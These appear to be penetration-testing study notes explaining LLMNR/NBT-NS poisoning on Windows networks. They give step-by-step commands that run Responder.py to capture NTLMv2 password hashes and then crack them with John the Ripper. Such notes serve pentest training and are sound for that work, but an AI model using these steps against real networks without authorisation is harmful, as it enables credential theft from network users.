- LLMNR (Link Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are two main elements of Windows OSes that are used to perform name resolution for hosts present on the same link. These services are enabled by default in Windows OSes and can be used to extract the password hashes from a user.

- Since the awareness of this attack is low, there is a good chance of acquiring user credentials in an internal network penetration test. By listening for LLMNR/NBT-NS broadcast requests, an attacker can spoof the server and send a response claiming to be the legitimate server. After the victim system accepts the connection, it is possible to gain the victim’s user-credentials by using a tool such as Responder.py.

- Responder is an LLMNR, NBT-NS, and MDNS poisoner. It responds to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool only responds to a File Server Service request, which is for SMB.


- Using Responder
	> cd Responder
	> chmod +x ./Responder.py
	> sudo ./Responder.py -I eth0
	
		- -I: specifies the interface (here, **eth0**). However, the network interface might be different in your machine, to check the interface issue ifconfig command.

	- now the target machine must request for a file, for example: requesting for a file by using "run", which in turn accepts the request from responder.
	- By default, Responder stores the logs in **Home/Responder/logs**. Navigate to the same location and double-click the **SMB-NTLMv2-SSP-10.10.10.10.txt** file.
	- Now, attempt to crack the hashes to learn the password of the logged-in user
	- Using John the Ripper
		> sudo snap install john-the-ripper
		> sudo john /home/ubuntu/Responder/logs/#log_file_name.txt